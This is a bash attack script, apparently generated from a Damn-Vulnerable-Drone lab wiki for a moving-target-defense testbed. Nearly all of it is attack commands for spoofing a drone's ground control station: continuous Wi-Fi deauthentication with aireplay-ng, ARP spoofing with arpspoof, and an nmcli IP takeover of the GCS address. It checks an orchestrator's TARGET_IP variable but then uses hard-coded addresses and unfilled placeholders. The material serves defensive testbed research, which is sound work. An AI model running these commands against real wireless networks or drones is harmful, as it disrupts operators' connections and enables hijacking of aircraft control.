#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Ground-Control-Station-Spoofing.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# =======================================================================
# MTD-aware Target Acquisition (from Orchestrator Environment)
# =======================================================================
# 이 스크립트는 attack_orchestrator.py에 의해 TARGET_IP와 TARGET_PORT 환경 변수가
# 설정될 것을 기대하고 실행됩니다.

if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "This script must be run via the attack_orchestrator.py" >&2
    exit 1
fi

echo "[INFO] Attack target acquired from orchestrator: ${TARGET_IP}:${TARGET_PORT}"
# MTD_INTERFACE_END

set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=ground-control-station-spoofing src=Ground-Control-Station-Spoofing.md"
log "[BLOCK 1] type=shell"
sudo aireplay-ng --deauth 0 -a <AP_MAC> -c <GCS_MAC> wlan0mon

log "[BLOCK 2] type=shell"
wget https://s3-us-west-2.amazonaws.com/qgroundcontrol/latest/QGroundControl.AppImage
chmod +x QGroundControl.AppImage
./QGroundControl.AppImage

log "[BLOCK 3] type=shell"
mavproxy.py

log "[BLOCK 4] type=shell"
ifconfig wlan0

log "[BLOCK 5] type=shell"
sudo arpspoof -i wlan0 -t 192.168.13.14 -r 192.168.13.1

log "[BLOCK 6] type=shell"
nmcli connection modify "Drone_Wifi" ipv4.method manual \
ipv4.addresses 192.168.13.14/24 \
ipv4.gateway 192.168.13.1 \
ipv4.dns "8.8.8.8 8.8.4.4"

log "[BLOCK 7] type=shell"
nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"

log "[BLOCK 8] type=shell"
nmcli connection modify "Drone_Wifi" ipv4.method manual \
ipv4.addresses 192.168.13.10/24 \
ipv4.gateway 192.168.13.1 \
ipv4.dns "8.8.8.8 8.8.4.4"
nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"

